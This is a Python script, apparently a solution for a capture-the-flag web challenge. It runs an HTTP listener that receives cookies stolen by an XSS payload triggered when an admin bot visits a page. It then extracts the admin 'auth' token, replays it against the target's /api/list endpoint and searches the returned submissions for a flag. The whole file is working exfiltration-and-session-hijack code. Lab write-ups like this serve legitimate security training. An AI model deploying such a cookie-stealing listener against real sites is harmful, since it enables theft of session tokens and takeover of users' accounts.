from http.server import HTTPServer, BaseHTTPRequestHandler
import requests
import json
from urllib.parse import urlparse, parse_qs

admin_token = None

class ExfilHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global admin_token
        
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        if 'data' in params:
            data = params['data'][0]
            print(f"\n[+] Received exfiltrated data: {data}")
            
            # Parse cookie to get auth token
            if 'auth=' in data:
                admin_token = data.split('auth=')[1].split(';')[0]
                print(f"[+] Extracted admin token: {admin_token[:50]}...")
                
                # Try to access /api/list with the admin token
                print(f"\n[+] Attempting to access /api/list with admin token...")
                try:
                    response = requests.get(
                        'http://localhost:1337/api/list',
                        cookies={'auth': admin_token}
                    )
                    print(f"Status: {response.status_code}")
                    print(f"Response: {response.text}")
                    
                    if response.status_code == 200:
                        data = response.json()
                        print(f"\n[SUCCESS] Got submissions:")
                        print(json.dumps(data, indent=2))
                        
                        # Look for flag
                        if 'submissions' in data:
                            for submission in data['submissions']:
                                idea = submission.get('idea', '')
                                if 'HTB{' in idea or 'FLAG{' in idea or 'flag' in idea.lower():
                                    print(f"\n🚩 FOUND FLAG: {idea}")
                except Exception as e:
                    print(f"Error accessing /api/list: {e}")
        
        # Send response
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b'OK')
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass

print("[+] Starting exfiltration listener on http://0.0.0.0:8000")
print("[*] Waiting for bot to visit /list and execute XSS...")
print("[*] Bot visits every ~35 seconds, please wait...")

server = HTTPServer(('0.0.0.0', 8000), ExfilHandler)

try:
    server.serve_forever()
except KeyboardInterrupt:
    print("\n[-] Shutting down...")
    if admin_token:
        print(f"[+] Admin token was: {admin_token}")
